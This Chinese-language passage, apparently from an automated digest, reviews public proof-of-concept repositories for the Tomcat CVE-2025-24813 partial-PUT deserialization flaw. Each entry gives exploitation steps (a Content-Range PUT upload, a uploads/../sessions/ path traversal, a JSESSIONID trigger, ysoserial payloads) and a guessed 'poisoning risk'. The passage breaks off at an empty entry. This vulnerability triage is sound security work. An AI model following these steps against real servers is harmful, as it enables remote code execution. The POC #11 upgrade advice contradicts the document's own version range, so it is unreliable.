提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

